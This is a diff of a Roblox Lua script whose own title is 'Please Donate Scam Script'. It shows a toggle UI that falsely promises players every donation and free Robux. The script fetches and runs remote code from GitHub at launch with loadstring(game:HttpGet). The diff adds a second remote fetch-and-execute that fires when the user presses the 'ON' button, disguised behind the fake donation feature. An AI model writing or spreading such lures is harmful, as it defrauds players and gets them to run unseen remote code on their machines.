@@ -1,4 +1,4 @@
--- Lade und führe das erste Script aus
+-- Lade und führe das erste Script direkt aus
 print("Lade das erste Script...")
 local success, result = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/Adrighg/Pls-donate-script./refs/heads/main/Pls%20Donate%20Script", true))()
@@ -17,9 +17,9 @@ task.wait(1)
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-print("Zweites Script gestartet") -- Debugging
+print("Zweites Script vorbereitet.") -- Debugging
 
--- Erstelle eine ScreenGui (aber noch nicht sichtbar)
+-- Erstelle eine ScreenGui (anfangs unsichtbar)
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ToggleUI"
 screenGui.ResetOnSpawn = false -- Behalte die UI nach Respawn
@@ -51,6 +51,7 @@ titleLabel.BorderSizePixel = 0
 titleLabel.Text = "Please Donate Scam Script"
 titleLabel.TextColor3 = Color3.new(1, 1, 1)
 titleLabel.TextScaled = true
+titleLabel.Font = Enum.Font.Gotham -- Belasse die Schrift
 titleLabel.Parent = mainFrame
 
 -- Abgerundete Ecken für Titel
@@ -66,6 +67,7 @@ toggleButton.BackgroundColor3 = Color3.new(1, 0, 0) -- Startfarbe: Rot (OFF)
 toggleButton.Text = "OFF"
 toggleButton.TextColor3 = Color3.new(1, 1, 1)
 toggleButton.TextScaled = true
+toggleButton.Font = Enum.Font.Gotham -- Belasse die Schrift
 toggleButton.BorderSizePixel = 0
 toggleButton.Parent = mainFrame
 
@@ -82,6 +84,7 @@ donationTextLabel.BackgroundTransparency = 1 -- Kein Hintergrund
 donationTextLabel.Text = "Get All Donations"
 donationTextLabel.TextColor3 = Color3.new(1, 1, 1)
 donationTextLabel.TextScaled = true
+donationTextLabel.Font = Enum.Font.Gotham -- Belasse die Schrift
 donationTextLabel.Parent = mainFrame
 
 -- Popup-Meldung unten rechts erstellen
@@ -107,6 +110,7 @@ popupLabel.BackgroundTransparency = 1
 popupLabel.Text = "You get now every Donation, go AFK and wait for your Robux"
 popupLabel.TextColor3 = Color3.new(1, 1, 1)
 popupLabel.TextScaled = true
+popupLabel.Font = Enum.Font.Gotham -- Belasse die Schrift
 popupLabel.Parent = popupFrame
 
 -- Verzögerung von 23 Sekunden
@@ -121,6 +125,18 @@ toggleButton.MouseButton1Click:Connect(function()
         toggleButton.Text = "ON"
         toggleButton.BackgroundColor3 = Color3.new(0, 1, 0) -- Farbe ändern zu grün (ON)
         popupFrame.Visible = true -- Popup sichtbar machen
+
+        -- Führe das zweite Script aus
+        print("Lade das zweite Script...")
+        local success, result = pcall(function()
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/Adrighg/-pls-donate-script-2/refs/heads/main/pls%20donate%20script%202", true))()
+        end)
+
+        if not success then
+            warn("Fehler beim Laden des zweiten Scripts:", result)
+        else
+            print("Zweites Script erfolgreich ausgeführt.")
+        end
 
         -- Nach 5 Sekunden das Popup wieder ausblenden
         task.delay(5, function()
